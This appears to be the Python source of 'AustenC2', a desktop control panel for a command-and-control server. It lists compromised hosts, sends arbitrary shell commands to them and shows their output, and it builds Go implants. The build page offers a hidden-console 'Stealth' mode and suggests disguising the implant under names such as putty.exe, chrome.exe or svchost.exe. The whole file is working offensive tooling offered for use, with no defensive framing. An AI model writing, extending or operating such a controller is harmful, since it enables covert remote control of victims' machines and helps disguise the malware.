import customtkinter as ctk
from tkinter import messagebox, filedialog
import requests
import threading
import time
import subprocess
import os
from datetime import datetime

ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("blue")

C2_SERVER = "http://10.10.10.10:5000"  # change ip

class Austen(ctk.CTk):
    def __init__(self):
        super().__init__()
        
        self.title("AustenC2")
        self.geometry("1400x800")  
        
        self.agents = []
        self.selected_agent = None
        
        self.setup_ui()
        self.start_refresh()
    
    def setup_ui(self):
        sidebar = ctk.CTkFrame(self, width=180)
        sidebar.pack(side="left", fill="y", padx=0, pady=0)

        ctk.CTkLabel(sidebar, text="AustenC2",
                    font=ctk.CTkFont(size=20, weight="bold")).pack(pady=20)
        
        ctk.CTkButton(sidebar, text="📊 Agents",
                     command=lambda: self.show_page("agents")).pack(pady=10, padx=15, fill="x")
        
        ctk.CTkButton(sidebar, text="📋 Tasks",
                     command=lambda: self.show_page("tasks")).pack(pady=10, padx=15, fill="x")
        
        ctk.CTkButton(sidebar, text="🔨 Build Agent",
                     command=lambda: self.show_page("build"),
                     fg_color="#9b59b6",
                     hover_color="#8e44ad").pack(pady=10, padx=15, fill="x")
        
        ctk.CTkLabel(sidebar, text="").pack(pady=40)

        self.status_label = ctk.CTkLabel(sidebar, text="🔴 Offline", text_color="red")
        self.status_label.pack(pady=10)
        
        ctk.CTkButton(sidebar, text="🔄 Refresh",
                     command=self.refresh_all).pack(pady=10, padx=15, fill="x")
        self.main_area = ctk.CTkFrame(self)
        self.main_area.pack(side="right", fill="both", expand=True)
        self.pages = {}
        self.pages["agents"] = self.create_agents_page()
        self.pages["tasks"] = self.create_tasks_page()
        self.pages["build"] = self.create_build_page()  
        self.show_page("agents")
        self.check_connection()
    
    def create_agents_page(self):
        page = ctk.CTkFrame(self.main_area)
        left_frame = ctk.CTkFrame(page, width=400)
        left_frame.pack(side="left", fill="both", expand=False, padx=(10, 5), pady=10)
        left_frame.pack_propagate(False)
        
        ctk.CTkLabel(left_frame, text="Agents",
                    font=ctk.CTkFont(size=20, weight="bold")).pack(pady=10, anchor="w", padx=10)
        
        self.agents_frame = ctk.CTkScrollableFrame(left_frame)
        self.agents_frame.pack(fill="both", expand=True, padx=10, pady=10)
        
        right_frame = ctk.CTkFrame(page)
        right_frame.pack(side="right", fill="both", expand=True, padx=(5, 10), pady=10)
        
        exec_frame = ctk.CTkFrame(right_frame)
        exec_frame.pack(fill="x", padx=10, pady=(10, 5))
        
        ctk.CTkLabel(exec_frame, text="💻 Execute Command",
                    font=ctk.CTkFont(size=16, weight="bold")).pack(pady=10, anchor="w", padx=10)
        
        self.selected_label = ctk.CTkLabel(exec_frame, text="No agent selected", text_color="gray")
        self.selected_label.pack(pady=5, anchor="w", padx=10)
        
        input_frame = ctk.CTkFrame(exec_frame, fg_color="transparent")
        input_frame.pack(fill="x", padx=10, pady=10)
        
        self.cmd_entry = ctk.CTkEntry(input_frame, placeholder_text="Enter command...",
                                      height=35, font=ctk.CTkFont(family="Courier"))
        self.cmd_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))
        self.cmd_entry.bind("<Return>", lambda e: self.execute_command())
        
        ctk.CTkButton(input_frame, text="⚡ Execute",
                     command=self.execute_command, width=100,
                     font=ctk.CTkFont(weight="bold")).pack(side="right")
        
        quick_frame = ctk.CTkFrame(exec_frame, fg_color="transparent")
        quick_frame.pack(fill="x", padx=10, pady=(0, 10))
        
        quick_commands = ["whoami", "hostname", "ipconfig", "dir", "pwd", "netstat -an"]
        for cmd in quick_commands:
            ctk.CTkButton(quick_frame, text=cmd, width=85, height=25,
                         command=lambda c=cmd: self.quick_command(c),
                         font=ctk.CTkFont(size=10)).pack(side="left", padx=2)
        
        results_frame = ctk.CTkFrame(right_frame)
        results_frame.pack(fill="both", expand=True, padx=10, pady=(5, 10))
        
        results_header = ctk.CTkFrame(results_frame, fg_color="transparent")
        results_header.pack(fill="x", padx=10, pady=10)
        
        ctk.CTkLabel(results_header, text="📄 Results",
                    font=ctk.CTkFont(size=16, weight="bold")).pack(side="left")
        
        ctk.CTkButton(results_header, text="🔄 Refresh Results",
                     command=lambda: self.refresh_results(self.selected_agent['id'] if self.selected_agent else None),
                     width=120, height=28).pack(side="right")
        
        self.results_frame = ctk.CTkScrollableFrame(results_frame)
        self.results_frame.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        return page
    
    def create_tasks_page(self):
        page = ctk.CTkFrame(self.main_area)
        
        ctk.CTkLabel(page, text="📋 All Tasks",
                    font=ctk.CTkFont(size=24, weight="bold")).pack(pady=20, anchor="w", padx=20)
        
        self.tasks_frame = ctk.CTkScrollableFrame(page)
        self.tasks_frame.pack(fill="both", expand=True, padx=20, pady=10)
        
        return page
    
    def create_build_page(self):
        page = ctk.CTkFrame(self.main_area)
        
        ctk.CTkLabel(page, text="🔨 Agent",
                    font=ctk.CTkFont(size=24, weight="bold")).pack(pady=20, anchor="w", padx=20)
        
        options_frame = ctk.CTkFrame(page)
        options_frame.pack(fill="x", padx=20, pady=10)
        
        os_frame = ctk.CTkFrame(options_frame, fg_color="transparent")
        os_frame.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(os_frame, text="Operating System:",
                    font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=5)
        
        self.os_var = ctk.StringVar(value="windows")
        os_options = ["windows", "linux"]
        
        os_buttons = ctk.CTkFrame(os_frame, fg_color="transparent")
        os_buttons.pack(anchor="w", pady=5)
        
        for os_type in os_options:
            icon = {"windows": "🪟", "linux": "🐧"}
            ctk.CTkRadioButton(os_buttons, text=f"{icon[os_type]} {os_type.capitalize()}",
                              variable=self.os_var, value=os_type,
                              font=ctk.CTkFont(size=12)).pack(side="left", padx=10)
        
        arch_frame = ctk.CTkFrame(options_frame, fg_color="transparent")
        arch_frame.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(arch_frame, text="Architecture:",
                    font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=5)
        
        self.arch_var = ctk.StringVar(value="amd64")
        arch_options = ["amd64", "386", "arm64"]
        
        arch_buttons = ctk.CTkFrame(arch_frame, fg_color="transparent")
        arch_buttons.pack(anchor="w", pady=5)
        
        for arch in arch_options:
            ctk.CTkRadioButton(arch_buttons, text=arch,
                              variable=self.arch_var, value=arch,
                              font=ctk.CTkFont(size=12)).pack(side="left", padx=10)
        
        console_frame = ctk.CTkFrame(options_frame, fg_color="transparent")
        console_frame.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(console_frame, text="Window Mode (Windows only):",
                    font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=5)
        
        self.console_var = ctk.StringVar(value="gui")
        
        console_buttons = ctk.CTkFrame(console_frame, fg_color="transparent")
        console_buttons.pack(anchor="w", pady=5)
        
        ctk.CTkRadioButton(console_buttons, text="No Console (Stealth)",
                          variable=self.console_var, value="gui",
                          font=ctk.CTkFont(size=12)).pack(side="left", padx=10)
        
        ctk.CTkRadioButton(console_buttons, text="With Console (Debug)",
                          variable=self.console_var, value="console",
                          font=ctk.CTkFont(size=12)).pack(side="left", padx=10)
        
        filename_frame = ctk.CTkFrame(options_frame, fg_color="transparent")
        filename_frame.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(filename_frame, text="Output Filename:",
                    font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=5)
        
        filename_input = ctk.CTkFrame(filename_frame, fg_color="transparent")
        filename_input.pack(fill="x", pady=5)
        
        self.filename_entry = ctk.CTkEntry(filename_input,
                                          placeholder_text="e.g., putty.exe, chrome.exe, svchost.exe",
                                          font=ctk.CTkFont(size=12),
                                          height=35)
        self.filename_entry.pack(side="left", fill="x", expand=True, padx=(0, 10))
        self.filename_entry.insert(0, "putty.exe")
        
        server_frame = ctk.CTkFrame(options_frame, fg_color="transparent")
        server_frame.pack(fill="x", padx=20, pady=10)
        
        ctk.CTkLabel(server_frame, text="C2 Server URL:",
                    font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", pady=5)
        
        self.server_entry = ctk.CTkEntry(server_frame,
                                        placeholder_text="http://10.54.50.172:5000", # change
                                        font=ctk.CTkFont(size=12),
                                        height=35)
        self.server_entry.pack(fill="x", pady=5)
        self.server_entry.insert(0, C2_SERVER)
        
        build_btn_frame = ctk.CTkFrame(options_frame, fg_color="transparent")
        build_btn_frame.pack(fill="x", padx=20, pady=20)
        
        ctk.CTkButton(build_btn_frame, text="🔨 Agent",
                    command=self.build_agent,
                    font=ctk.CTkFont(size=16, weight="bold"),
                    height=45,
                    fg_color="#27ae60",
                    hover_color="#229954").pack(fill="x")
        
        output_frame = ctk.CTkFrame(page)
        output_frame.pack(fill="both", expand=True, padx=20, pady=(0, 20))
        
        ctk.CTkLabel(output_frame, text="📋 Build Output:",
                    font=ctk.CTkFont(size=14, weight="bold")).pack(anchor="w", padx=10, pady=10)
        
        self.build_output = ctk.CTkTextbox(output_frame,
                                          font=ctk.CTkFont(family="Courier", size=11),
                                          fg_color="#1a1a1a")
        self.build_output.pack(fill="both", expand=True, padx=10, pady=(0, 10))
        
        return page
    
    def build_agent(self):
        """Build Go agent with selected options"""
        os_type = self.os_var.get()
        arch = self.arch_var.get()
        console_mode = self.console_var.get()
        filename = self.filename_entry.get().strip()
        server_url = self.server_entry.get().strip()
        
        if not filename:
            messagebox.showerror("Error", "Please enter output filename!")
            return
        
        self.build_output.delete("1.0", "end")
        
        if os_type == "windows" and not filename.endswith(".exe"):
            filename += ".exe"
        
        ldflags = "-s -w"
        if os_type == "windows" and console_mode == "gui":
            ldflags = "-H windowsgui -s -w"
        
        os.makedirs("payloads", exist_ok=True)
        output_path = os.path.join("payloads", filename)
        
        env = os.environ.copy()
        env["GOOS"] = os_type
        env["GOARCH"] = arch
        
        cmd = [
            "go", "build",
            "-ldflags", ldflags,
            "-o", output_path,
            "agent.go"
        ]
        
        self.log_build(f"🔨 Building agent...")
        self.log_build(f"OS: {os_type}")
        self.log_build(f"Architecture: {arch}")
        self.log_build(f"Console: {'Hidden' if console_mode == 'gui' and os_type == 'windows' else 'Visible'}")
        self.log_build(f"Output: {output_path}")
        self.log_build(f"C2 Server: {server_url}")
        self.log_build("-" * 60)
        
        def run_build():
            try:
                self.log_build("Running: " + " ".join(cmd))
                self.log_build("")
                
                process = subprocess.Popen(
                    cmd,
                    env=env,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True
                )
                
                stdout, stderr = process.communicate()
                
                if process.returncode == 0:
                    # Success
                    size = os.path.getsize(output_path)
                    size_mb = size / (1024 * 1024)
                    
                    self.log_build("✅ Build successful!")
                    self.log_build(f"📁 Output: {output_path}")
                    self.log_build(f"📊 Size: {size_mb:.2f} MB ({size:,} bytes)")
                    self.log_build("")
                    self.log_build("🎯 Agent is ready to deploy!")
                    
                    # Show success message
                    self.after(0, lambda: messagebox.showinfo(
                        "Success",
                        f"Agent built successfully!\n\n"
                        f"File: {output_path}\n"
                        f"Size: {size_mb:.2f} MB"
                    ))
                else:
                    # Error
                    self.log_build("❌ Build failed!")
                    self.log_build("")
                    if stderr:
                        self.log_build("Error output:")
                        self.log_build(stderr)
                    
                    self.after(0, lambda: messagebox.showerror(
                        "Build Failed",
                        f"Failed to build agent!\n\n{stderr[:200]}"
                    ))
                
            except FileNotFoundError:
                self.log_build("❌ Error: Go compiler not found!")
                self.log_build("")
                self.log_build("Please install Go:")
                self.log_build("https://golang.org/dl/")
                
                self.after(0, lambda: messagebox.showerror(
                    "Error",
                    "Go compiler not found!\n\nPlease install Go from:\nhttps://golang.org/dl/"
                ))
                
            except Exception as e:
                self.log_build(f"❌ Error: {e}")
                self.after(0, lambda: messagebox.showerror("Error", str(e)))
        
        # Start build thread
        thread = threading.Thread(target=run_build, daemon=True)
        thread.start()
    
    def log_build(self, message):
        """Add message to build output"""
        self.build_output.insert("end", message + "\n")
        self.build_output.see("end")
    
    def show_page(self, page_name):
        for page in self.pages.values():
            page.pack_forget()
        
        self.pages[page_name].pack(fill="both", expand=True)
        
        if page_name == "agents":
            self.refresh_agents()
            if self.selected_agent:
                self.refresh_results(self.selected_agent['id'])
        elif page_name == "tasks":
            self.refresh_tasks()
    
    def check_connection(self):
        try:
            response = requests.get(f"{C2_SERVER}/", timeout=2)
            if response.status_code == 200:
                self.status_label.configure(text="🟢 Online", text_color="green")
                return True
        except:
            pass
        
        self.status_label.configure(text="🔴 Offline", text_color="red")
        return False
    
    def refresh_all(self):
        if not self.check_connection():
            messagebox.showerror("Error", "Cannot connect to server!")
            return
        
        self.refresh_agents()
        self.refresh_tasks()
        if self.selected_agent:
            self.refresh_results(self.selected_agent['id'])
    
    def refresh_agents(self):
        try:
            response = requests.get(f"{C2_SERVER}/api/agents", timeout=5)
            if response.status_code == 200:
                self.agents = response.json()['agents']
                
                for widget in self.agents_frame.winfo_children():
                    widget.destroy()
                
                if not self.agents:
                    ctk.CTkLabel(self.agents_frame, text="No agents connected",
                                text_color="gray", font=ctk.CTkFont(size=14)).pack(pady=20)
                    return
                
                for agent in self.agents:
                    self.create_agent_card(agent)
        except Exception as e:
            print(f"Error: {e}")
    
    def create_agent_card(self, agent):
        status_colors = {
            'online': "#2ecc71",
            'idle': "#f39c12",
            'offline': "#e74c3c"
        }
        
        card = ctk.CTkFrame(self.agents_frame, border_width=2,
                           border_color=status_colors.get(agent['status'], 'gray'))
        card.pack(fill="x", padx=5, pady=5)
        
        info = ctk.CTkFrame(card, fg_color="transparent")
        info.pack(side="left", fill="both", expand=True, padx=10, pady=10)
        
        ctk.CTkLabel(info, text=f"● {agent['status'].upper()}",
                    text_color=status_colors.get(agent['status']),
                    font=ctk.CTkFont(size=11, weight="bold")).pack(anchor="w")
        
        ctk.CTkLabel(info, text=f"🖥️ {agent['hostname']}",
                    font=ctk.CTkFont(size=15, weight="bold")).pack(anchor="w", pady=(3, 0))
        
        ctk.CTkLabel(info, text=f"👤 {agent['username']} | 💻 {agent['os']}",
                    text_color="gray", font=ctk.CTkFont(size=10)).pack(anchor="w", pady=(2, 0))
        
        ctk.CTkLabel(info, text=f"🌐 {agent['ip']}",
                    text_color="gray", font=ctk.CTkFont(size=10)).pack(anchor="w")
        
        btn_frame = ctk.CTkFrame(card, fg_color="transparent")
        btn_frame.pack(side="right", padx=10, pady=10)
        
        ctk.CTkButton(btn_frame, text="Select", width=80, height=28,
                     command=lambda a=agent: self.select_agent(a),
                     font=ctk.CTkFont(size=11)).pack(pady=2)
        
        ctk.CTkButton(btn_frame, text="️Delete", width=80, height=28,
                     fg_color="#e74c3c", hover_color="#c0392b",
                     command=lambda a=agent: self.delete_agent(a),
                     font=ctk.CTkFont(size=11)).pack(pady=2)
    
    def select_agent(self, agent):
        self.selected_agent = agent
        self.selected_label.configure(
            text=f"Selected: {agent['hostname']} ({agent['ip']})",
            text_color="green"
        )
        self.cmd_entry.focus()
        self.refresh_results(agent['id'])
    
    def delete_agent(self, agent):
        result = messagebox.askyesno(
            "Delete Agent",
            f"Delete agent '{agent['hostname']}'?\n\nThis will remove:\n- Agent data\n- All tasks\n- All results"
        )
        if result:
            try:
                response = requests.delete(f"{C2_SERVER}/api/agents/{agent['id']}",timeout=5)
                if response.status_code == 200:
                    messagebox.showinfo("Success", f"Agent '{agent['hostname']}' deleted!")
                    if self.selected_agent and self.selected_agent['id'] == agent['id']:
                        self.selected_agent = None
                        self.selected_label.configure(
                            text="No agent selected",
                            text_color="gray"
                        )
                        for widget in self.results_frame.winfo_children():
                            widget.destroy()
                    self.refresh_agents()
                else:
                    messagebox.showerror("Error", "Failed to delete agent")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to delete agent:\n{e}")
    def execute_command(self):
        if not self.selected_agent:
            messagebox.showwarning("Warning", "Select an agent first!")
            return
        command = self.cmd_entry.get().strip()
        if not command:
            return
        
        try:
            response = requests.post(
                f"{C2_SERVER}/api/tasks",
                json={"agent_id": self.selected_agent['id'], "command": command},
                timeout=5
            )
            
            if response.status_code == 200:
                self.cmd_entry.delete(0, 'end')
                
                temp_card = ctk.CTkFrame(self.results_frame, fg_color="#2ecc71")
                temp_card.pack(fill="x", padx=5, pady=5)
                
                ctk.CTkLabel(temp_card, text=f"✅ Command sent: {command}",
                            font=ctk.CTkFont(size=12),
                            text_color="white").pack(padx=10, pady=10)
                
                self.after(2000, lambda: self.refresh_results(self.selected_agent['id']))
                
        except Exception as e:
            messagebox.showerror("Error", f"Failed: {e}")
    
    def quick_command(self, cmd):
        self.cmd_entry.delete(0, 'end')
        self.cmd_entry.insert(0, cmd)
        self.execute_command()
    
    def refresh_tasks(self):
        try:
            response = requests.get(f"{C2_SERVER}/api/tasks", timeout=5)
            if response.status_code == 200:
                tasks = response.json()['tasks']
                
                for widget in self.tasks_frame.winfo_children():
                    widget.destroy()
                
                if not tasks:
                    ctk.CTkLabel(self.tasks_frame, text="No tasks",
                                text_color="gray").pack(pady=20)
                    return
                
                for task in tasks[:30]:
                    self.create_task_card(task)
        except Exception as e:
            print(f"Error: {e}")
    
    def create_task_card(self, task):
        status_colors = {
            'pending': '#f39c12',
            'sent': '#3498db',
            'completed': '#2ecc71'
        }
        
        card = ctk.CTkFrame(self.tasks_frame, border_width=1,
                           border_color=status_colors.get(task['status'], 'gray'))
        card.pack(fill="x", padx=5, pady=5)
        
        header = ctk.CTkFrame(card, fg_color="transparent")
        header.pack(fill="x", padx=10, pady=(10, 5))
        
        ctk.CTkLabel(header, text=f"Task #{task['id']}",
                    font=ctk.CTkFont(size=12, weight="bold")).pack(side="left")
        
        ctk.CTkLabel(header, text=task['status'].upper(),
                    text_color=status_colors.get(task['status']),
                    font=ctk.CTkFont(size=10, weight="bold")).pack(side="right")
        
        ctk.CTkLabel(card, text=f"💻 {task['command']}",
                    font=ctk.CTkFont(family="Courier", size=11)).pack(anchor="w", padx=10, pady=5)
        
        ctk.CTkLabel(card, text=f"🖥️ {task.get('hostname', 'Unknown')} | 🕒 {task['created'][:19]}",
                    text_color="gray", font=ctk.CTkFont(size=9)).pack(anchor="w", padx=10, pady=(0, 10))
    
    def refresh_results(self, agent_id=None):
        try:
            url = f"{C2_SERVER}/api/results"
            if agent_id:
                url += f"?agent_id={agent_id}"
            response = requests.get(url, timeout=5)
            if response.status_code == 200:
                results = response.json()['results']
                for widget in self.results_frame.winfo_children():
                    widget.destroy()
                if not results:
                    ctk.CTkLabel(self.results_frame, text="No results yet\n\nExecute commands to see results here",
                                text_color="gray", font=ctk.CTkFont(size=13)).pack(pady=30)
                    return
                for result in results[:20]:
                    self.create_result_card(result)
        except Exception as e:
            print(f"Error: {e}")
    def create_result_card(self, result):
        card = ctk.CTkFrame(self.results_frame, border_width=1)
        card.pack(fill="x", padx=5, pady=5)
        header = ctk.CTkFrame(card, fg_color="transparent")
        header.pack(fill="x", padx=10, pady=(8, 5))
        ctk.CTkLabel(header, text=f"Result #{result['id']}",
                    font=ctk.CTkFont(size=11, weight="bold")).pack(side="left")
        ctk.CTkLabel(header, text=result['timestamp'][:19],
                    text_color="gray", font=ctk.CTkFont(size=9)).pack(side="right")
        ctk.CTkLabel(card, text=f"{result['command']}",
                    font=ctk.CTkFont(size=11),
                    text_color="#3498db").pack(anchor="w", padx=10, pady=(0, 5))
        output_box = ctk.CTkTextbox(card, height=150,font=ctk.CTkFont(family="Courier", size=10),fg_color="#1a1a1a")
        output_box.pack(fill="x", padx=10, pady=(0, 8))
        output_box.insert("1.0", result['output'])
        output_box.configure(state="disabled")
    def start_refresh(self):
        def refresh_loop():
            while True:
                try:
                    self.check_connection()
                except:
                    pass
                time.sleep(5)
        thread = threading.Thread(target=refresh_loop, daemon=True)
        thread.start()
if __name__ == "__main__":
    app = Austen()
    app.mainloop()
